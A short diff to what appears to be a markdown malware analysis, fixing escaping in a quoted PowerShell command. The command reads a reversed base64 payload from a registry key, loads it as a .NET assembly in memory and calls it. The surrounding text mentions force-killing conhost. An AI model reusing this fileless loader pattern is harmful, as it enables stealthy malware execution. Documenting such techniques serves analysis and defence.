@@ -114,7 +114,7 @@ Executes Powershell, searches for the powershell process before calling the next
 
 Read the value from registry subkey "v" (created by VBS script), passes to the powershell process, enters and sleeps. The "v" value contains powershell commands the powershell command 
 ```ps
-{[}AppDomain{]}::CurrentDomain.Load{(}[Convert{]}::FromBase64String{(}{(}-join {(}Get-ItemProperty -LiteralPath 'HKCU:\Software\650594173' -Name 's'{)}.s | ForEach-Object {{}$_{[}-1..-{(}$_.Length{)}{]}{}}{)}{)}{)}; {[}a.a{]}::a{(}'650594173'{)}".
+{[}AppDomain{]}::CurrentDomain.Load{(}[Convert{]}::FromBase64String{(}{(}-join {(}Get-ItemProperty -LiteralPath 'HKCU:\Software\650594173' -Name 's'{)}.s | ForEach-Object {$_{[}-1..-{(}$_.Length{)}{]}}{)}{)}{)}; {[}a.a{]}::a{(}'650594173'{)}".
 ``` 
 
 After that, the string "Stop-Process -Name conhost -Force" is passed to the powershell process and enters. 
